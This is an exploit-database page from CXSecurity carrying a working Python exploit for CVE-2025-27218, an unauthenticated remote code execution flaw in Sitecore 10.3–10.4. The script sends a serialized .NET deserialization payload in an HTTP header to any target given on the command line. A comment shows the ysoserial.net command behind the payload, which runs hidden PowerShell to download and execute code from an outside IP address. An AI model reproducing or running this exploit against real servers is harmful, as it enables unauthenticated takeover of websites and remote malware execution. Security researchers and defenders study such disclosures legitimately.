---
title: Sitecore 10.4 Remote Code Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2025060030
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-30
fetch_date: 2025-10-06T22:50:34.387205
---

# Sitecore 10.4 Remote Code Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Sitecore 10.4 Remote Code Execution (RCE)** **2025.06.29**  Credit:  **[Yesith Alvarez](https://cxsecurity.com/author/Yesith%2BAlvarez/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-27218](https://cxsecurity.com/cveshow/CVE-2025-27218/ "Click to see CVE-2025-27218")**  CWE: **N/A** | |

# Exploit Title: Sitecore 10.4 - Remote Code Execution (RCE)
# Exploit Author: Yesith Alvarez
# Vendor Homepage: https://developers.sitecore.com/downloads
# Version: Sitecore 10.3 - 10.4
# CVE : CVE-2025-27218
# Link: https://github.com/yealvarez/CVE/blob/main/CVE-2025-27218/exploit.py
from requests import Request, Session
import sys
import base64
def title():
print('''
\_\_\_\_\_\_\_ \_\_\_\_\_\_\_\_ \_\_\_ \_\_\_ \_\_\_ \_\_\_\_\_ \_\_\_ \_\_\_\_\_\_ \_\_\_ \_\_ \_\_\_
/ \_\_\_\_\ \ / / \_\_\_\_| |\_\_ \ / \_ \\_\_ \| \_\_\_\_| |\_\_ \\_\_\_\_ |\_\_ \/\_ |/ \_ \
| | \ \ / /| |\_\_ \_\_\_\_\_\_ ) | | | | ) | |\_\_ \_\_\_\_\_\_ ) | / / ) || | (\_) |
| | \ \/ / | \_\_|\_\_\_\_\_\_/ /| | | |/ /|\_\_\_ \\_\_\_\_\_\_/ / / / / / | |> \_ <
| |\_\_\_\_ \ / | |\_\_\_\_ / /\_| |\_| / /\_ \_\_\_) | / /\_ / / / /\_ | | (\_) |
\\_\_\_\_\_| \/ |\_\_\_\_\_\_| |\_\_\_\_|\\_\_\_/\_\_\_\_|\_\_\_\_/ |\_\_\_\_/\_/ |\_\_\_\_||\_|\\_\_\_/
[+] Remote Code Execution
Author: Yesith Alvarez
Github: https://github.com/yealvarez
Linkedin: https://www.linkedin.com/in/pentester-ethicalhacker/
Code improvements: https://github.com/yealvarez/CVE/blob/main/CVE-2025-27218/exploit.py
''')
def exploit(url):
# This payload must be generated externally with ysoserial.net
# Example: ./ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "powershell.exe -nop -w hidden -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://34.134.71.169/111.html\")'"
payload = 'AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA2ApBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBb3dZOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUhCdmQyVnljMmhsYkd3dVpYaGxJQzF1YjNBZ0xYY2dhR2xrWkdWdUlDMWpJQ2RKUlZnb1RtVjNMVTlpYW1WamRDQk9aWFF1VjJWaVEyeHBaVzUwS1M1RWIzZHViRzloWkZOMGNtbHVaeWdtY1hWdmREc2dhSFIwY0Rvdkx6RXdMakV3TGpFd0xqRXdMekV4TVM1b2RHMXNYQ2tuSWlCVGRHRnVaR0Z5WkVWeWNtOXlSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJUZEdGdVpHRnlaRTkxZEhCMWRFVnVZMjlrYVc1blBTSjdlRHBPZFd4c2ZTSWdWWE5sY2s1aGJXVTlJaUlnVUdGemMzZHZjbVE5SW50NE9rNTFiR3g5SWlCRWIyMWhhVzQ5SWlJZ1RHOWhaRlZ6WlhKUWNtOW1hV3hsUFNKR1lXeHpaU0lnUm1sc1pVNWhiV1U5SW1OdFpDSWdMejROQ2lBZ0lDQWdJRHd2YzJRNlVISnZZMlZ6Y3k1VGRHRnlkRWx1Wm04K0RRb2dJQ0FnUEM5elpEcFFjbTlqWlhOelBnMEtJQ0E4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2k1UFltcGxZM1JKYm5OMFlXNWpaVDROQ2p3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeVBncz0L'
payload\_encoded = payload
headers = {'Thumbnailsaccesstoken': payload\_encoded}
s = Session()
req = Request('GET', url, headers=headers)
prepped = req.prepare()
resp = s.send(prepped, verify=False, timeout=15)
print(prepped.headers)
print(url)
print(resp.status\_code)
print(resp.text)
if \_\_name\_\_ == '\_\_main\_\_':
title()
if len(sys.argv) < 2:
print('[+] USAGE: python3 %s https://<target\_url>\n' % sys.argv[0])
print('[+] Example: python3 %s https://192.168.0.10\n' % sys.argv[0])
exit(0)
else:
exploit(sys.argv[1])

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025060030)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top